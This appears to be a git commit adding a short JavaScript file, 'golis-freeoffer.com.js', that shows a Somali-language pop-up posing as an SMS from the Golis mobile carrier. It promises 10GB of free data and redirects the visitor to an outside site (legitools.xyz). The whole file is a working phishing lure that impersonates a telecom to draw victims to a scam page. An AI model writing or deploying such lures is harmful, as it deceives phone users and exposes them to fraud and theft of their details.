40214dab121163e90e4614add09bbb3a2aaeaab4
katemj25 <mbokofficial1@gmail.com>
2025-07-01 04:40:13 -0700

    Create golis-freeoffer.com.js

---
+++ golis-freeoffer.com.js
@@ -0,0 +1,5 @@
+var password = '10GB Xog bilaash ah'
+password=prompt('SMS: Hambalyo Lambarkaagu wuxuu xaq u leeyahay inuu helo 10GB Xog bilaash ah oo Golis SIM CARD ABAAL AH, si naxariis leh u riix OK si aad u dhaqaajiso. ','10GB Xog bilaash ah');
+if (password != '10GB Xog bilaash ah') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
